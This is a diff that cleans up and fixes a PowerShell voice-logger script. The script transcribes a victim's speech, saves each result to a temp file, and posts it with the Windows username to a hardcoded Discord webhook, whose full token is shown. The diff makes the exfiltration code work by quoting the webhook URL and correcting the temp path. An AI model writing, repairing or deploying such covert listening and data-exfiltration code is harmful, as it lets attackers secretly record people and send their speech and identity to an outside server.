@@ -1,22 +1,22 @@
 function DC-Upload {
 
-	[CmdletBinding()]
-	param (
-		[parameter(Position=0,Mandatory=$False)]
-		[string]$text 
-	)
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$text 
+    )
 
-	$dc = https://discord.com/api/webhooks/1214869769946275843/cvJANOrIVKj1beFvMTkKZ54xNAkiLekpMLaJhB4rIS_BLHR-_70CX3n2JMF3VBTDZUxU
+    $dc = "https://discord.com/api/webhooks/1214869769946275843/cvJANOrIVKj1beFvMTkKZ54xNAkiLekpMLaJhB4rIS_BLHR-_70CX3n2JMF3VBTDZUxU"
 
-	$Body = @{
-	  'username' = $env:username
-	  'content' = $text
-	}
+    $Body = @{
+      'username' = $env:username
+      'content' = $text
+    }
 
-	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
+    if (-not [string]::IsNullOrEmpty($text)) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
+    }
 }
-
-
 
 function voiceLogger {
 
@@ -31,14 +31,14 @@ function voiceLogger {
         if ($result) {
             $results = $result.Text
             Write-Output $results
-            $log = "$env:tmp/VoiceLog.txt"
+            $log = "$env:temp/VoiceLog.txt"
             echo $results > $log
-            $text = get-content $log -raw
+            $text = Get-Content $log -Raw
             DC-Upload $text
 
             # Use a switch statement with the $results variable
             switch -regex ($results) {
-                '\bnote\b' {saps notepad}
+                '\bnote\b' {Start-Process notepad}
                 '\bexit\b' {break}
             }
         }
